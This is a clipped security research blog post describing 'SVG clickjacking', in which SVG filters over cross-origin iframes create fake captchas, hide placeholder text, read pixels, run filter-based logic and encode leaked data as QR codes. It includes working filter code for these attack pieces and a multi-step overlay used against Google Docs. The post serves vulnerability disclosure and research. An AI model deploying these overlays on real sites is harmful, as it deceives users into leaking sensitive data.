---
title: "SVG Filters - Clickjacking 2.0"
source: "https://lyra.horse/blog/2025/12/svg-clickjacking/"
author:
  - "lyra's epic blog"
published: 2025-12-05
created: 2025-12-05
description: "A novel and powerful twist on an old classic."
tags:
  - "clippings/articles"
  - "_inbox"
---
# SVG Filters - Clickjacking 2.0

![]()

> [!summary]
> > The article introduces \"SVG clickjacking,\" a novel attack technique leveraging SVG filters to perform complex, interactive clickjacking and data exfiltration on cross-origin iframes.
> 
> Unlike traditional clickjacking, which is limited to simple button presses, SVG clickjacking allows for sophisticated attacks by manipulating pixel data within iframes.
> 
> Key SVG filter elements like `feColorMatrix`, `feDisplacementMap`, `feBlend`, and `feComposite` are used as \"building blocks\" to create attack primitives.
> 
> Examples include:
> -   **Fake captchas:** Using `feDisplacementMap` to distort text, tricking users into retyping sensitive information for exfiltration.
> -   **Grey text hiding:** Masking placeholder or unwanted text (e.g., \"too short\" warnings) in input fields using a chain of filters like `feComposite`, `feTile`, `feMorphology`, `feFlood`, `feBlend`, and `feColorMatrix`.
> -   **Pixel reading:** Detecting color changes at specific pixel locations within the iframe, enabling dynamic responses like toggling effects or simulating hover states and fake form validation.
> -   **Logic gates:** Demonstrating that SVG filters can implement logical operations (AND, OR, NOT, XOR, etc.) using `feBlend` and `feComposite`, allowing for functionally complete, multi-step attack flows and conditional logic based on iframe content.
> -   **QR code generation:** Encoding exfiltrated data (e.g., from pixel reads) into a dynamic QR code displayed within the filter, which the user is then prompted to scan, sending the data to the attacker's server.
> 
> The author successfully demonstrated the technique against Google Docs, earning a bounty for a multi-step attack involving captcha input, dynamic visuals, and conditional logic. The author asserts this is a novel vulnerability class and emphasizes the creative potential of treating CSS and SVG as programming languages for exploitation.

I’ve discovered a new technique that turns classic clickjacking on its head and enables the creation of complex interactive clickjacking attacks, as well as multiple forms of data exfiltration.

Liquid Glass redesign was pretty chaotic.

a thought came to mind - how hard would it be to re-create this effect? Could I do this, on the web, without resorting to canvas and shaders? I got to work, and about an hour later I had [a pretty accurate CSS/SVG recreation of the effect](https://codepen.io/rebane2001/details/OPVQXMv)[^1].

A few days passed, and another thought came to mind - would this SVG effect work on top of an iframe?

But, to my surprise, it did.

The reason this was so interesting to me is that my liquid glass effect uses the `feColorMatrix` and `feDisplacementMap` SVG filters - changing the colors of pixels, and moving them, respectively. And I could do that on a cross-origin document?

This got me wondering - do any of the other filters work on iframes, and could we turn that into an attack somehow? It turns out that it’s all of them, and yes!

## Building blocks

I got to work, going through every [<fe\*>](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element#f) SVG element and figuring out which ones can be combined to build our own attack primitives.

These filter elements take in one or more input images, apply operations to them, and output a new image. You can chain a bunch of them together within a single SVG filter, and refer to the output of any of the previous filter elements in the chain.

Let’s take a look at some of the more useful base elements we can play with:

- [**<feImage>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feImage) - load an image file;
- [**<feFlood>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feFlood) - draw a rectangle;
- [**<feOffset>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feOffset) - move stuff around;
- [**<feDisplacementMap>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feDisplacementMap) - move pixels according to a map;
- [**<feGaussianBlur>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feGaussianBlur) - blur stuff;
- [**<feTile>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feTile) - tiling and cropping utility;
- [**<feMorphology>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feMorphology) - expand/grow light or dark areas;
- [**<feBlend>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feBlend) - blend two inputs according to the [mode](https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode);
- [**<feComposite>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feComposite) - compositing utilities, can be used to apply an alpha matte, or do various arithmetics on one or two inputs;
- [**<feColorMatrix>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feColorMatrix) - apply a color matrix, this allows moving colors between channels and converting between alpha and luma mattes;

### Fake captcha

I’ll start off with an example of basic data exfiltration. Suppose you’re targeting an iframe that contains some sort of sensitive code. You *could* ask the user to retype it by itself, but that’d probably seem suspicious.

What we can do instead is make use of `feDisplacementMap` to make the text seem like a captcha! This way, the user is far more likely to retype the code.

`<iframe src="..." style="filter:url(#captchaFilter)"></iframe> <svg width="768" height="768" viewBox="0 0 768 768" xmlns="http://www.w3.org/2000/svg">   <filter id="captchaFilter">     <feTurbulence       type="turbulence"       baseFrequency="0.03"       numOctaves="4"       result="turbulence" />     <feDisplacementMap       in="SourceGraphic"       in2="turbulence"       scale="6"       xChannelSelector="R"       yChannelSelector="G" />   </filter> </svg> `

### Grey text hiding

The next example is for situations where you want to trick someone into, for example, interacting with a text input. Oftentimes the inputs have stuff like grey placeholder text in them, so showing the input box by itself won’t cut it.

`<filter>   <feComposite operator=arithmetic                k1=0 k2=4 k3=0 k4=0 />   <feTile x=20 y=56 width=184 height=22 />   <feMorphology operator=erode radius=3 result=thick />   <feFlood flood-color=#FFF result=white />   <feBlend mode=difference in=thick in2=white />   <feComposite operator=arithmetic k2=100 />   <feColorMatrix type=matrix       values="0 0 0 0 0               0 0 0 0 0               0 0 0 0 0               0 0 1 0 0" />   <feComposite in=SourceGraphic operator=in />   <feTile x=21 y=57 width=182 height=20 />   <feBlend in2=white />   <feBlend mode=difference in2=white />   <feComposite operator=arithmetic k2=1 k4=0.02 /> </filter> `

### Pixel reading

And now we come to what is most likely the most useful attack primitive - pixel reading. That’s right, you can use SVG filters to read color data off of images and perform all sorts of logic on them to create really advanced and convincing attacks.

The catch is of course, that you’ll have to do everything within SVG filters - there is no way to get the data out[^6]. Despite that, it is very powerful if you get creative with it.

`<!-- util --> <feOffset in="SourceGraphic" dx="0" dy="0" result=src /> <feTile x="16px" y="16px" width="4" height="4" in=src /> <feTile x="0" y="0" width="100%" height="100%" result=a /> <feTile x="48px" y="16px" width="4" height="4" in=src /> <feTile x="0" y="0" width="100%" height="100%" result=b /> <feTile x="72px" y="16px" width="4" height="4" in=src /> <feTile x="0" y="0" width="100%" height="100%" result=c /> <feFlood flood-color=#FFF result=white /> <!-- A ⊕ B --> <feBlend mode=difference in=a in2=b result=ab /> <!-- [A ⊕ B] ⊕ C --> <feBlend mode=difference in2=c /> <!-- Save result to 'out' --> <feTile x="96px" y="0px" width="32" height="32" result=out /> <!-- C ∧ [A ⊕ B] --> <feComposite operator=arithmetic k1=1 in=ab in2=c result=abc /> <!-- (A ∧ B) --> <feComposite operator=arithmetic k1=1 in=a in2=b /> <!-- [A ∧ B] ∨ [C ∧ (A ⊕ B)] --> <feComposite operator=arithmetic k2=1 k3=1 in2=abc /> <!-- Save result to 'carry' --> <feTile x="64px" y="32px" width="32" height="32" result=carry /> <!-- Combine results --> <feBlend in2=out /> <feBlend in2=src result=done /> <!-- Shift first row to last --> <feTile x="0" y="0" width="100%" height="32" /> <feTile x="0" y="0" width="100%" height="100%" result=lastrow /> <feOffset dx="0" dy="-32" in=done /> <feBlend in2=lastrow /> <!-- Crop to output --> <feTile x="0" y="0" width="100%" height="100%" /> `

Anyways, for an attacker, what all of this means is that you can make a multi-step clickjacking attack with lots of conditions and interactivity. And you can run logic on data from cross-origin frames.

And this is how we would implement it in SVG:

`<!-- util --> <feTile x="14px" y="4px" width="4" height="4" in=SourceGraphic /> <feTile x="0" y="0" width="100%" height="100%" /> <feColorMatrix type=matrix result=debugEnabled   values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" /> <feFlood flood-color=#FFF result=white /> <!-- attack imgs --> <feImage xlink:href="data:..." x=0 y=0 width=420 height=220 result=button1.png></feImage> <feImage xlink:href="data:..." x=0 y=0 width=420 height=220 result=loading.png></feImage> <feImage xlink:href="data:..." x=0 y=0 width=420 height=220 result=checkbox.png></feImage> <feImage xlink:href="data:..." x=0 y=0 width=420 height=220 result=button2.png></feImage> <feImage xlink:href="data:..." x=0 y=0 width=420 height=220 result=end.png></feImage> <!-- D (dialog visible) --> <feTile x="4px" y="4px" width="4" height="4" in=SourceGraphic /> <feTile x="0" y="0" width="100%" height="100%" /> <feBlend mode=difference in2=white /> <feComposite operator=arithmetic k2=100 k4=-1 result=D /> <!-- L (dialog loaded) --> <feTile x="313px" y="141px" width="4" height="4" in=SourceGraphic /> <feTile x="0" y="0" width="100%" height="100%" result="dialogBtn" /> <feBlend mode=difference in2=white /> <feComposite operator=arithmetic k2=100 k4=-1 result=L /> <!-- C (checkbox checked) --> <feFlood flood-color=#0B57D0 /> <feBlend mode=difference in=dialogBtn /> <feComposite operator=arithmetic k2=4 k4=-1 /> <feComposite operator=arithmetic k2=100 k4=-1 /> <feColorMatrix type=matrix                values="1 1 1 0 0                        1 1 1 0 0                        1 1 1 0 0                        1 1 1 1 0" /> <feBlend mode=difference in2=white result=C /> <!-- R (red text visible) --> <feMorphology operator=erode radius=3 in=SourceGraphic /> <feTile x="17px" y="150px" width="4" height="4" /> <feTile x="0" y="0" width="100%" height="100%" result=redtext /> <feColorMatrix type=matrix                values="0 0 1 0 0                        0 0 0 0 0                        0 0 0 0 0                        0 0 1 0 0" /> <feComposite operator=arithmetic k2=2 k3=-5 in=redtext /> <feColorMatrix type=matrix result=R                values="1 0 0 0 0                        1 0 0 0 0                        1 0 0 0 0                        1 0 0 0 1" /> <!-- Attack overlays --> <feColorMatrix type=matrix in=R   values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" /> <feComposite in=end.png operator=in /> <feBlend in2=button1.png /> <feBlend in2=SourceGraphic result=out /> <feColorMatrix type=matrix in=C   values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" /> <feComposite in=button2.png operator=in /> <feBlend in2=checkbox.png result=loadedGraphic /> <feColorMatrix type=matrix in=L   values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" /> <feComposite in=loadedGraphic operator=in /> <feBlend in2=loading.png result=dialogGraphic /> <feColorMatrix type=matrix in=D   values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" /> <feComposite in=dialogGraphic operator=in /> <feBlend in2=out /> `

## The Docs bug

I’ve actually managed to pull off this attack against Google Docs!

Take a look at the demo videos [here](https://infosec.exchange/@rebane2001/115265287713185877) (alt links: [bsky](https://bsky.app/profile/rebane2001.bsky.social/post/3lzo4euxo5s2p), [twitter](https://twitter.com/rebane2001/status/1971213061580259814)).

## The QR attack

Something I see in online discussions often is the insistence on QR codes being dangerous. It kind of rubs me the wrong way because QR codes are not any more dangerous than links.

I turns out though, that my SVG filters attack technique can be applied to QR codes as well!

### Creating the QR

Creating a QR code within an SVG filter is easier said than done however. We can shape binary data into the shape of a QR code by using `feDisplacementMap`, but for a QR code to be scannable it also needs error correction data.

QR codes use [Reed-Solomon error correction](https://en.wikipedia.org/wiki/Reed%E2%80%93Solomon_error_correction), which is some fun math stuff that’s a bit more advanced than a simple checksum. It does math with polynomials and stuff and that is a bit annoying to reimplement in an SVG.

Luckily for us, I’ve faced the same problem before! Back in 2021 I was the first person[^11] to [make a QR code generator in Minecraft](https://www.planetminecraft.com/project/rebane-s-qr-code-generator/), so I’ve already figured out the things necessary.

In my build I pre-calculated some lookup tables for the error correction, and used those instead to make the build simpler - and we can do the same with the SVG filter.

## And so on..

There are so many ways to make use of this technique I won’t have time to go over them all in this post. Some examples would be reading text by using the difference blend mode, or exfiltrating data by making the user click on certain parts of the screen.

You could even insert data from the outside to have a fake mouse cursor inside the SVG that shows the *pointer* cursor and reacts to fake buttons inside your SVG to make the exfiltration more realistic.

Or you could code up attacks with CSS and SVG where CSP doesn’t allow for any JS.

Anyways, this post is long as is, so I’ll leave figuring out these techniques as homework.